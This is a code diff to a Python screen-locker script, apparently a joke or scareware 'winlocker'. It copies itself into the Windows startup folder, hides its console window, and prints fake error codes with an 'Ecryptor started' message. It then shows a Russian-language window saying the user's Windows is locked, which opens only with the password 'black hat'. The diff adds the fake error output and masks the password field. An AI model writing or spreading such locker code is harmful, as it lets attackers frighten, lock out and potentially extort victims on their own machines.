@@ -17,13 +17,16 @@ def add_to_startup_folder():
     try:
         shutil.copy2(script_path, startup_folder)
     except Exception as e:
-        print(f"!✗ Ошибка: {e}")
-
-print("00x(2)00003 system error")
-print("00x1003")
-time.sleep(0.2)
-print("000x300002")
-print("000x0004200 Ecryptor activated!")
+         print("ошибка автозагрузки!")
+print(r"""
+error: ox0374582
+error: 0x34769432
+error: 0x017238""")
+time.sleep(1)
+print(r"""error: 0x675825637
+error: 0x63836426""")
+time.sleep(0.5)
+print('Ecryptor started')
 time.sleep(1)
 os.system('cls' if os.name == 'nt' else 'clear')
 print(r"""
@@ -54,7 +57,7 @@ time.sleep(0.5)
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def check_input(event=None):
-    user_input = entry.get().strip()  
+    user_input = entry.get().strip() 
     if user_input == "black hat":  
         messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
         root.destroy() 
@@ -76,7 +79,7 @@ label = tk.Label(root, text="ваш виндовс заблокирован k9gy
 label.pack(pady=20)
 
 
-entry = tk.Entry(root, width=30, font=("Arial", 25))
+entry = tk.Entry(root, show="*", width=30, font=("Arial", 25))
 entry.pack(pady=10)
 
 
